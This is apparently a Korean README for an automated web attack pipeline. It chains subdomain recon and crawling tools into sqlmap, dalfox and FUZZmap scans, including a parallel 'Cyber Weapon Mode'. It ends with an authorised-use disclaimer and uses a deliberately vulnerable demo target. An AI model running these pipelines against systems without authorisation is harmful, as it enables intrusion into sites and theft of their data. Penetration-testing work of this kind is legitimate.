# SEA

> **Cyber Weapon Framework — S**ubSurfer · **E**ndAbyss · **A**ttack

📚 **Languages:** [English](README.md) · [한국어](README_ko.md)

SEA는 단일 도메인을 입력받아 **서브도메인 자산 식별 → 엔드포인트/파라미터 수집 → 취약점 공격**까지 한 흐름으로 이어주는 공격 자동화 파이프라인 프레임워크입니다. 모든 도구가 표준 입출력 파이프(`|`)로 자연스럽게 연결되도록 설계되었습니다.

---

## 🧩 구성 도구

| 단계 | 도구 | 역할 | 저장소 |
|------|------|------|--------|
| 1. Recon | **SubSurfer** | 서브도메인 수집 · Takeover 점검 · 포트 스캔 | [arrester/SubSurfer](https://github.com/arrester/SubSurfer) |
| 2. Crawl | **EndAbyss** | 엔드포인트 / 파라미터 / 디렉토리 스캔 | [arrester/EndAbyss](https://github.com/arrester/EndAbyss) |
| 3-a. Attack | **FUZZmap** | 웹 취약점 자동 퍼징 (SQLi / XSS / SSTI) | [offensive-tooling/FUZZmap](https://github.com/offensive-tooling/FUZZmap) |
| 3-b. Attack | **sqlmap** | SQL Injection 정밀 공격 | [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap) |
| 3-c. Attack | **dalfox** | XSS 전용 정밀 스캐너 | [hahwul/dalfox](https://github.com/hahwul/dalfox) |

---

## ⚙️ 설치

```bash
pip install subsurfer endabyss fuzzmap sqlmap
brew install dalfox        # macOS
# go install github.com/hahwul/dalfox/v2@latest  # 그 외 OS
```

> 동적 크롤링이 필요하면 EndAbyss용 Playwright 브라우저 설치:
> `playwright install chromium`

---

## 🎯 공통 입력 변수 & 작업 디렉터리

```bash
export TARGET="testasp.vulnweb.com"
mkdir -p sea-results && cd sea-results
```

> **📌 노이즈 제거:** SubSurfer 내부의 `webtech` 라이브러리는 `Database file is older than 30 days.` 메시지를 stdout으로 흘립니다. 모든 파이프라인에서 `grep -v "Database file"` 으로 제거합니다.
>
> **📌 URL 필터:** EndAbyss는 일부 비정상 라인을 stdout으로 출력할 수 있으므로 `grep -E '^https?://'` 로 정상 URL만 필터링합니다.
>
> **📌 Fallback:** SubSurfer가 활성 웹 서버를 찾지 못한 경우(패시브 결과가 모두 죽어 있을 때)를 대비해 원본 타겟을 항상 합쳐서 다음 단계로 전달합니다.

---

# 🟢 Normal Test Mode

> 한 번에 한 가지 공격 도구만 실행. 결과를 직관적으로 보고 싶을 때.

## ▶ Full Process — `Subdomain → Endpoint → Attack`

SubSurfer 정찰부터 시작해 모든 단계를 거칩니다. **`-to` (Takeover 검증) + `-fp` (Fast Port) + EndAbyss + 공격 도구** 의 끝-끝 파이프라인입니다.

### 옵션 1) Full → FUZZmap (종합 퍼징)

```bash
{ subsurfer -t "$TARGET" -to -fp -pipewsub 2>/dev/null | grep -v "Database file"; echo "$TARGET"; } \
  | sort -u \
  | xargs -I{} endabyss -t "http://{}" -pipeurl --silent 2>/dev/null \
  | grep -E '^https?://' | sort -u > urls.txt

xargs -a urls.txt -I{} -P3 fuzzmap -t "{}" -rp -a | tee fuzzmap.log
```

### 옵션 2) Full → sqlmap (SQL Injection)

```bash
{ subsurfer -t "$TARGET" -to -fp -pipewsub 2>/dev/null | grep -v "Database file"; echo "$TARGET"; } \
  | sort -u \
  | xargs -I{} endabyss -t "http://{}" -pipeurl --silent 2>/dev/null \
  | grep -E '^https?://' | sort -u > urls.txt

sqlmap -m urls.txt --batch --random-agent --smart \
       --threads=10 --level=2 --risk=1 --timeout=15 \
       --output-dir=./sqlmap-out | tee sqlmap.log
```

### 옵션 3) Full → dalfox (XSS)

```bash
{ subsurfer -t "$TARGET" -to -fp -pipewsub 2>/dev/null | grep -v "Database file"; echo "$TARGET"; } \
  | sort -u \
  | xargs -I{} endabyss -t "http://{}" -pipeurl --silent 2>/dev/null \
  | grep -E '^https?://' | sort -u > urls.txt

dalfox file urls.txt --skip-bav --skip-headless --skip-mining-all \
       --worker 50 --format plain -o dalfox.log
```

---

## ▶ Single Process — `Endpoint → Attack`

이미 대상 호스트가 명확하다면 SubSurfer 단계를 건너뛰고 EndAbyss부터 시작합니다.

### 옵션 1) EndAbyss → FUZZmap

```bash
endabyss -t "http://$TARGET" -pipeurl --silent 2>/dev/null \
  | grep -E '^https?://' | sort -u > urls.txt

xargs -a urls.txt -I{} -P3 fuzzmap -t "{}" -rp -a | tee fuzzmap.log
```

### 옵션 2) EndAbyss → sqlmap

```bash
endabyss -t "http://$TARGET" -pipeurl --silent 2>/dev/null \
  | grep -E '^https?://' | sort -u > urls.txt

sqlmap -m urls.txt --batch --random-agent --smart \
       --threads=10 --level=2 --risk=1 --timeout=15 \
       --output-dir=./sqlmap-out | tee sqlmap.log
```

### 옵션 3) EndAbyss → dalfox

```bash
endabyss -t "http://$TARGET" -pipeurl --silent 2>/dev/null \
  | grep -E '^https?://' | sort -u > urls.txt

dalfox file urls.txt --skip-bav --skip-headless --skip-mining-all \
       --worker 50 --format plain -o dalfox.log
```

---

# 🔴 Cyber Weapon Mode

> **세 공격 도구를 동시에 가동**해 최단 시간에 최대 표면 공격. EndAbyss의 `-ds`(Directory Scanning) 옵션으로 숨겨진 엔드포인트까지 발굴합니다.

## ▶ Full Process — `Subdomain → Endpoint(-ds) → Parallel Attack`

```bash
# 1) Recon: SubSurfer → EndAbyss(-ds) → urls.txt
{ subsurfer -t "$TARGET" -to -fp -pipewsub 2>/dev/null | grep -v "Database file"; echo "$TARGET"; } \
  | sort -u \
  | xargs -I{} endabyss -t "http://{}" -ds -pipeurl --silent 2>/dev/null \
  | grep -E '^https?://' | sort -u > urls.txt

echo "[+] Collected $(wc -l < urls.txt) URLs"
[ ! -s urls.txt ] && { echo "[!] urls.txt is empty. Aborting."; exit 1; }

# 2) 3-Way 병렬 공격
( xargs -a urls.txt -I{} -P5 fuzzmap -t "{}" -rp -a > fuzzmap.log 2>&1 ) & PID_FUZZ=$!

( sqlmap -m urls.txt --batch --random-agent --smart \
         --threads=10 --level=2 --risk=1 --timeout=15 \
         --output-dir=./sqlmap-out > sqlmap.log 2>&1 ) & PID_SQL=$!

( dalfox file urls.txt --skip-bav --skip-headless --skip-mining-all \
         --worker 50 --format plain -o dalfox.log > dalfox.stdout.log 2>&1 ) & PID_DAL=$!

echo "[+] Parallel attack started: FUZZmap($PID_FUZZ) / sqlmap($PID_SQL) / dalfox($PID_DAL)"
wait
echo "[✓] All attacks finished. Check fuzzmap.log / sqlmap.log / dalfox.log"
```

---

## ▶ Single Process — `Endpoint(-ds) → Parallel Attack`

```bash
# 1) Recon: EndAbyss(-ds) → urls.txt
endabyss -t "http://$TARGET" -ds -pipeurl --silent 2>/dev/null \
  | grep -E '^https?://' | sort -u > urls.txt

echo "[+] Collected $(wc -l < urls.txt) URLs"
[ ! -s urls.txt ] && { echo "[!] urls.txt is empty. Aborting."; exit 1; }

# 2) 3-Way 병렬 공격
( xargs -a urls.txt -I{} -P5 fuzzmap -t "{}" -rp -a > fuzzmap.log 2>&1 ) & PID_FUZZ=$!

( sqlmap -m urls.txt --batch --random-agent --smart \
         --threads=10 --level=2 --risk=1 --timeout=15 \
         --output-dir=./sqlmap-out > sqlmap.log 2>&1 ) & PID_SQL=$!

( dalfox file urls.txt --skip-bav --skip-headless --skip-mining-all \
         --worker 50 --format plain -o dalfox.log > dalfox.stdout.log 2>&1 ) & PID_DAL=$!

echo "[+] Parallel attack started: FUZZmap($PID_FUZZ) / sqlmap($PID_SQL) / dalfox($PID_DAL)"
wait
echo "[✓] All attacks finished. Check fuzzmap.log / sqlmap.log / dalfox.log"
```

> 디렉토리 스캐닝에 커스텀 워드리스트를 사용하려면 `endabyss ... -ds -w /path/to/wordlist.txt` 로 교체합니다.

---

## ⏱️ 예상 소요 시간 & 동작 확인 팁

| 단계 | 한 호스트당 대략 소요 |
|------|----------------------|
| SubSurfer (`-to -fp`) | 1 ~ 3 분 |
| EndAbyss (`-pipeurl`) | 5 ~ 30 초 |
| EndAbyss (`-ds`) | 1 ~ 10 분 (워드리스트 크기에 따라) |
| FUZZmap (URL 1개, `-rp -a`) | 5 ~ 20 초 |
| sqlmap (URL 1개, `--smart`) | 10 초 ~ 수 분 |
| **dalfox (URL 1개)** | **30 ~ 60 초** ← 가장 느림 |

> **즉시 결과를 못 본다고 멈춘 게 아닙니다.** 특히 dalfox와 sqlmap은 한 URL당 수십 초 ~ 수 분이 걸리므로, 백그라운드로 돌리고 로그 파일을 `tail -f` 로 모니터링하세요.
>
> ```bash
> tail -f fuzzmap.log sqlmap.log dalfox.log
> ```

---

## 🛠️ 단계별 핵심 옵션 치트 시트

### SubSurfer
| 옵션 | 의미 |
|------|------|
| `-t <domain>` | 대상 루트 도메인 |
| `-to` | 서브도메인 **Takeover** 검증 |
| `-fp` | **Fast Port** 스캔 (주요 웹 포트만) |
| `-dp` / `-p 80,443,...` | 기본/커스텀 포트 스캔 |
| `-a` | 액티브 스캔 활성화 |
| `-pipewsub` | 살아있는 **웹 서버 호스트**만 stdout |
| `-pipeweb` | `http(s)://host:port` 형태 stdout |
| `-pipesub` | 모든 수집 서브도메인 stdout |
| `-pipejson` | 전체 결과 JSON stdout |

### EndAbyss
| 옵션 | 의미 |
|------|------|
| `-t <url>` | 대상 URL |
| `-m {static,dynamic}` | 정적/Playwright 동적 크롤링 |
| `-d <N>` | 크롤링 깊이 (기본 5, 무제한 0) |
| `-c <N>` | 동시 요청 수 |
| `-ds` | **Directory Scanning** 활성화 |
| `-w <file>` | 디렉토리 스캔용 워드리스트 |
| `--silent` | 배너/진행률 출력 끔 (파이프 친화) |
| `-pipeurl` | 파라미터 포함 URL stdout |
| `-pipeparam` | 파라미터만 stdout |
| `-pipeendpoint` | 엔드포인트만 stdout |
| `-pipejson` | 전체 결과 JSON stdout |

### FUZZmap
| 옵션 | 의미 |
|------|------|
| `-t <url>` | 대상 URL |
| `-m GET/POST` | HTTP 메서드 |
| `-p <name,name>` | 테스트할 파라미터 |
| `-rp` | **자동 파라미터 정찰** |
| `-a` | 고급 페이로드 (SQLi 심층 등) |

### sqlmap
| 옵션 | 의미 |
|------|------|
| `-u <url>` | 단일 URL |
| `-m <file>` | URL 리스트 파일 (멀티 타깃) |
| `--batch` | 모든 프롬프트 기본값 응답 |
| `--smart` | 의심스러운 파라미터만 점검 |
| `--threads=N` | 동시성 |
| `--level / --risk` | 탐지 강도 / 위험도 |
| `--timeout=N` | HTTP 응답 타임아웃 (초) |
| `--output-dir=PATH` | 결과 저장 경로 |

### dalfox
| 옵션 | 의미 |
|------|------|
| `dalfox url <u>` | 단일 URL 모드 |
| `dalfox file <f>` | 파일 리스트 모드 |
| `dalfox pipe` | stdin 파이프 모드 |
| `--worker N` | 동시 워커 수 |
| `--skip-bav` | 기타 취약점 점검 생략 |
| `--skip-headless` | 헤드리스 브라우저 검증 생략 |
| `--skip-mining-all` | 파라미터 마이닝 생략 (속도↑) |
| `--format plain/json` | 출력 형식 |
| `-o <file>` | 결과 저장 파일 |

---

## 🧪 빠른 검증

`testasp.vulnweb.com` 기준으로 SubSurfer/EndAbyss 단계가 정상 동작하는지 한 줄로 확인:

```bash
# (1) 정찰만
{ subsurfer -t testasp.vulnweb.com -to -fp -pipewsub 2>/dev/null | grep -v "Database file"; echo "testasp.vulnweb.com"; } | sort -u

# (2) 정찰 → 크롤링 → URL만
{ subsurfer -t testasp.vulnweb.com -to -fp -pipewsub 2>/dev/null | grep -v "Database file"; echo "testasp.vulnweb.com"; } \
  | sort -u \
  | xargs -I{} endabyss -t "http://{}" -pipeurl --silent 2>/dev/null \
  | grep -E '^https?://' | sort -u
```

(2)번을 실행하면 `http://testasp.vulnweb.com/showforum.asp?id=1` 같은 파라미터 URL이 약 15개 출력됩니다. 이 출력이 **모든 공격 모드의 공통 입력**입니다.

---

## 📁 결과 디렉터리 구조

```
sea-results/
├── urls.txt              # EndAbyss가 뽑아낸 공격 대상 URL 목록
├── fuzzmap.log           # FUZZmap 결과
├── sqlmap.log            # sqlmap stdout
├── sqlmap-out/           # sqlmap 세션·페이로드 저장
├── dalfox.log            # dalfox PoC 결과
└── dalfox.stdout.log     # dalfox 진행 로그
```

---

## ⚠️ 면책

본 프레임워크는 **합법적인 권한이 있는 자산**에 대해서만 사용해야 합니다. 무단 스캔/공격은 위법이며, 발생하는 모든 책임은 사용자에게 있습니다.

## 📝 License

Aapche-2.0 License
